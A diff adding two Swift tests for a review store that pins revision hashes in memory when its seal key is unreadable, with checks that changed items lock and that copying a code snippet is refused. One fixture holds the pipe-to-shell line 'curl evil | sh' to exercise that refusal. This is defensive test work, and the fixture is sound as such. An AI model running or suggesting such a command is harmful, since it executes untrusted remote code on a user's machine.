@@ -57,6 +57,56 @@ import Testing
         #expect(try Data(contentsOf: url) == before)
     }
 
+    /// With the seal refused, pins still live in memory for the run (only the save is skipped),
+    /// so an ask seen with a revision that comes back without one is locked, not legacy.
+    @Test func aRefusedSealKeyStillPinsInMemoryAndFailsClosed() async throws {
+        let defaults = TestDefaults()
+        defer { defaults.drop() }
+        let url = reviewsURL()
+        defer { try? FileManager.default.removeItem(at: url) }
+        let secrets = MemorySecretStore()
+        secrets.readError = .unreadable(-128)
+        let store = reviewingStore(defaults, secrets: secrets, url: url)
+        let two = revised("a", [idSteps(3), idSteps(4)])
+        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
+        await start(store, fake)
+        #expect(store.reviewsUnreadable)
+        #expect(store.record("a")?.pins[2] == two.detail.revisions[1].hash)
+
+        var stub = two.item
+        stub.revision = nil
+        stub.payload = Payload(instructable: idSteps(3, codes: [1: "curl evil | sh"]))
+        await fake.setItems([stub])
+        await fake.setDetail(AskDetail(item: stub, events: []))
+        await store.refresh()
+        #expect(store.reviewState("a") == .historyChanged(.missing))
+        #expect(store.copyCode("a", stamp: nil, text: "curl evil | sh") == .refused)
+        #expect(secrets.writes == 0)
+        #expect(!FileManager.default.fileExists(atPath: url.path))
+    }
+
+    /// Once the owner allows the seal, the pins taken in memory join the records on disk and are saved.
+    @Test func pinsTakenWhileTheSealWasRefusedAreKeptOnceItReads() async throws {
+        let defaults = TestDefaults()
+        defer { defaults.drop() }
+        let url = reviewsURL()
+        defer { try? FileManager.default.removeItem(at: url) }
+        let secrets = MemorySecretStore()
+        secrets.readError = .unreadable(-128)
+        let store = reviewingStore(defaults, secrets: secrets, url: url)
+        let two = revised("a", [idSteps(3), idSteps(4)])
+        await start(store, FakeQueueSource(items: [two.item], details: ["a": two.detail]))
+        #expect(store.reviewsUnreadable)
+
+        secrets.readError = nil
+        store.retryReviewKey()
+        #expect(!store.reviewsUnreadable)
+        #expect(store.record("a")?.pins[2] == two.detail.revisions[1].hash)
+        #expect(store.saveReviewsNow())
+        let key = try #require(store.sealKey)
+        #expect(ReviewStore.load(from: url, sealKey: key).records.values.first?.pins[2] == two.detail.revisions[1].hash)
+    }
+
     @Test func aPlantedSealKeyLoadsNoRecordsAndWritesNothing() async throws {
         let defaults = TestDefaults()
         defer { defaults.drop() }
@@ -78,7 +128,9 @@ import Testing
 
         #expect(store.reviewsUnreadable)
         #expect(store.notice == .reviewRecordsUnreadable)
-        #expect(store.record("a") == nil)
+        // Nothing from the planted file: only this run's pins, in memory.
+        #expect(store.record("a")?.accepted == nil)
+        #expect(store.record("a")?.seen == nil)
         #expect(store.reviewState("a").isLocked)
         #expect(!(await store.acceptRevision("a", stamp: two.detail.revisions[1].stamp)))
         #expect(secrets.writes == 0)
